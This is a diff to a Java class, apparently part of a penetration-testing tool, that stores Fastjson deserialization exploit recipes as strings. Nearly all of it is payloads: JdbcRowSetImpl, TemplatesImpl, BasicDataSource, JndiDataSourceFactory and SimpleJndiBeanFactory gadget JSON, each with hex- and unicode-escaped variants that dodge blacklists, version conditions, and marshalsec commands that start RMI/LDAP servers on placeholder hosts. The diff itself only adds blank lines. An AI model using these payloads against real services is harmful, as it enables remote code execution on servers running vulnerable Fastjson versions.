@@ -59,11 +59,14 @@ public class FastJson {
             "##Step2##\n" +
             "marshalsec start rmi/ldap service, \n" +
             "  rmi: java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer \"http://httpserver-ip:8808/#Calc\"\n" +
-            "  ladp: java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://httpserver-ip:8808/#Calc\"\n\n" +
+            "  ladp: java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://httpserver-ip:8808/#Calc\"\n" +
+            "\n" +
             "##Step3##\n" +
             "#poc:\n" +
             "{\"handsome\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://xxx.com/aaa\",\"autoCommit\":true}}\n" +
+            "\n" +
             "{\"handsome\":{\"@type\":\"\\x63\\x6f\\x6d.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://xxx.com/aaa\",\"autoCommit\":true}}\n" +
+            "\n" +
             "{\"handsome\":{\"@type\":\"\\u0063\\u006f\\u006d.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://xxx.com/aaa\",\"autoCommit\":true}}";
     public static String JdbcRowSetImpl_1_poc = "##Condition##\n" +
             "1.2.25 < version <= 1.2.41 + JDK1.8.0_102\n\n" +
@@ -93,7 +96,9 @@ public class FastJson {
             "##Step3##\n" +
             "#poc:\n" +
             "{\"handsome\":{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://xxx.com/aaa\",\"autoCommit\":true}}\n" +
+            "\n" +
             "{\"handsome\":{\"@type\":\"L\\x63\\x6f\\x6d.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://xxx.com/aaa\",\"autoCommit\":true}}\n" +
+            "\n" +
             "{\"handsome\":{\"@type\":\"L\\u0063\\u006f\\u006d.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://xxx.com/aaa\",\"autoCommit\":true}}";
     public static String JdbcRowSetImpl_2_poc = "##Condition##\n" +
             "version = 1.2.43 + JDK1.8.0_102\n\n" +
@@ -123,7 +128,9 @@ public class FastJson {
             "##Step3##\n" +
             "#poc:\n" +
             "{\"handsome\":{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{\"dataSourceName\":\"rmi_addr\",\"autoCommit\":true]}}\n" +
+            "\n" +
             "{\"handsome\":{\"@type\":\"[\\x63\\x6f\\x6d.sun.rowset.JdbcRowSetImpl\"[{\"dataSourceName\":\"rmi_addr\",\"autoCommit\":true]}}\n" +
+            "\n" +
             "{\"handsome\":{\"@type\":\"[\\u0063\\u006f\\u006d.sun.rowset.JdbcRowSetImpl\"[{\"dataSourceName\":\"rmi_addr\",\"autoCommit\":true]}}";
     public static String JdbcRowSetImpl_3_poc = "##Condition##\n" +
             "version = 1.2.42 + JDK1.8.0_102\n\n" +
@@ -153,7 +160,9 @@ public class FastJson {
             "##Step3##\n" +
             "#poc:\n" +
             "{\"handsome\":{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://xxx.com/aaa\",\"autoCommit\":true}}\n" +
+            "\n" +
             "{\"handsome\":{\"@type\":\"LL\\x63\\x6f\\x6d.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://xxx.com/aaa\",\"autoCommit\":true}}\n" +
+            "\n" +
             "{\"handsome\":{\"@type\":\"LL\\u0063\\u006f\\u006d.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://xxx.com/aaa\",\"autoCommit\":true}}";
     public static String JdbcRowSetImpl_4_poc = "##Condition##\n" +
             "version = 1.2.47 + JDK1.8.0_102\n\n" +
@@ -183,7 +192,9 @@ public class FastJson {
             "##Step3##\n" +
             "#poc:\n" +
             "{\"handsome\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"x\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://xxx.com/aaa\",\"autoCommit\":true}}}\n" +
+            "\n" +
             "{\"handsome\":{\"@type\":\"java.lang.Class\",\"val\":\"\\x63\\x6f\\x6d.sun.rowset.JdbcRowSetImpl\"},\"x\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://xxx.com/aaa\",\"autoCommit\":true}}}\n" +
+            "\n" +
             "{\"handsome\":{\"@type\":\"java.lang.Class\",\"val\":\"\\u0063\\u006f\\u006d.sun.rowset.JdbcRowSetImpl\"},\"x\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://xxx.com/aaa\",\"autoCommit\":true}}}";
     public static String TemplatesImpl_0_poc = "##Condition##\n" +
             "1.2.22 < version <= 1.2.24 + JDK1.8.0_102/1.7\n\n" +
@@ -231,7 +242,9 @@ public class FastJson {
             "    }\n\n" +
             "#Poc:\n" +
             "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"###EVIL_CODE###\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ },\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}\n" +
+            "\n" +
             "{\"@type\":\"\\x63\\x6f\\x6d.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"###EVIL_CODE###\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ },\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}\n" +
+            "\n" +
             "{\"@type\":\"\\u0063\\u006f\\u006d.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"###EVIL_CODE###\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ },\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}";
     public static String TemplatesImpl_1_poc = "##Condition##\n" +
             "1.2.22 < version <= 1.2.24 + JDK1.8.0_102/1.7\n\n" +
@@ -278,8 +291,10 @@ public class FastJson {
             "        return Base64.encodeBase64String(bos.toByteArray()); //Base64 form commons.codec\n" +
             "    }\n\n" +
             "#Poc:\n" +
-            "{\"@type\":\"org.apache.xalan.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"###EVIL_CODE###\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ },\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}\n"+
+            "{\"@type\":\"org.apache.xalan.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"###EVIL_CODE###\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ },\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}\n" +
+            "\n"+
             "{\"@type\":\"\\u006f\\u0072\\u0067.apache.xalan.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"###EVIL_CODE###\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ },\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}\n" +
+            "\n" +
             "{\"@type\":\"\\x6f\\x72\\x67.apache.xalan.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"###EVIL_CODE###\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ },\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}";
     public static String BasicDataSource_0_poc = "##Condition##\n" +
             "1.2.22 < version <= 1.2.24 + JDK1.8.0_102/1.7\n\n" +
@@ -313,8 +328,10 @@ public class FastJson {
             "        return Base64.encodeBase64String(bos.toByteArray()); //Base64 form commons.codec\n" +
             "    }\n\n" +
             "#Poc:\n" +
-            "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"###EVIL_CODE###\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ },\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}\n"+
+            "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"###EVIL_CODE###\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ },\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}\n" +
+            "\n"+
             "{\"@type\":\"\\x63\\x6f\\x6d.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"###EVIL_CODE###\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ },\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}\n" +
+            "\n" +
             "{\"@type\":\"\\u0063\\u006f\\u006d.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"###EVIL_CODE###\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ },\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}";
     public static String BasicDataSource_1_poc = "##Condition##\n" +
             "1.2.22 < version <= 1.2.24 + JDK1.8.0_102/1.7\n\n" +
@@ -348,8 +365,10 @@ public class FastJson {
             "        return Base64.encodeBase64String(bos.toByteArray()); //Base64 form commons.codec\n" +
             "    }\n\n" +
             "#Poc:\n" +
-            "{{\"@type\":\"com.alibaba.fastjson.JSONObject\",\"c\":{\"@type\":\"org.apache.commons.dbcp.BasicDataSource\",\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassName\":\"###EVIL_CODE###\"}}:\"ddd\"}\n"+
+            "{{\"@type\":\"com.alibaba.fastjson.JSONObject\",\"c\":{\"@type\":\"org.apache.commons.dbcp.BasicDataSource\",\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassName\":\"###EVIL_CODE###\"}}:\"ddd\"}\n" +
+            "\n"+
             "{{\"@type\":\"\\x63\\x6f\\x6d.alibaba.fastjson.JSONObject\",\"c\":{\"@type\":\"org.apache.commons.dbcp.BasicDataSource\",\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassName\":\"###EVIL_CODE###\"}}:\"ddd\"}\n" +
+            "\n" +
             "{{\"@type\":\"\\u0063\\u006f\\u006d.alibaba.fastjson.JSONObject\",\"c\":{\"@type\":\"org.apache.commons.dbcp.BasicDataSource\",\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassName\":\"###EVIL_CODE###\"}}:\"ddd\"}";
     public static String JndiDataSourceFactory_poc = "##Condition##\n" +
             "version = 1.2.47 + JDK1.8.0_102\n\n" +
@@ -378,8 +397,10 @@ public class FastJson {
             "  ladp: java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://httpserver-ip:8808/#Calc\"\n\n" +
             "##Step3##\n" +
             "#poc:\n" +
-            "{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"rmi://xxx.com\"/name\"}}\n"+
-            "{\"@type\":\"\\u006f\\u0072\\u0067.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"rmi://xxx.com\"/name\"}}\n"+
+            "{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"rmi://xxx.com\"/name\"}}\n" +
+            "\n"+
+            "{\"@type\":\"\\u006f\\u0072\\u0067.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"rmi://xxx.com\"/name\"}}\n" +
+            "\n"+
             "{\"@type\":\"\\x6f\\x72\\x67.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"rmi://xxx.com\"/name\"}}\n";
     public static String SimpleJndiBeanFactory_poc = "##Condition##\n" +
             "version = 1.2.47 + JDK1.8.0_102\n\n" +
@@ -409,7 +430,9 @@ public class FastJson {
             "##Step3##\n" +
             "#poc:\n" +
             "{\"handsome\": Set [{\"@type\":\"org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor\",\"beanFactory\":{\"@type\":\"org.springframework.jndi.support.SimpleJndiBeanFactory\",\"shareableResources\":[\"rmi://XXX.COM/name\"]},\"adviceBeanName\":\"rmi://XX.COM/name\"},{\"@type\":\"org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor\",}]}\n" +
+            "\n" +
             "{\"handsome\": Set [{\"@type\":\"\\u006f\\u0072\\u0067.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor\",\"beanFactory\":{\"@type\":\"org.springframework.jndi.support.SimpleJndiBeanFactory\",\"shareableResources\":[\"rmi://XXX.COM/name\"]},\"adviceBeanName\":\"rmi://XX.COM/name\"},{\"@type\":\"org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor\",}]}\n" +
+            "\n" +
             "{\"handsome\": Set [{\"@type\":\"\\x6f\\x72\\x67.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor\",\"beanFactory\":{\"@type\":\"org.springframework.jndi.support.SimpleJndiBeanFactory\",\"shareableResources\":[\"rmi://XXX.COM/name\"]},\"adviceBeanName\":\"rmi://XX.COM/name\"},{\"@type\":\"org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor\",}]};";
 
 
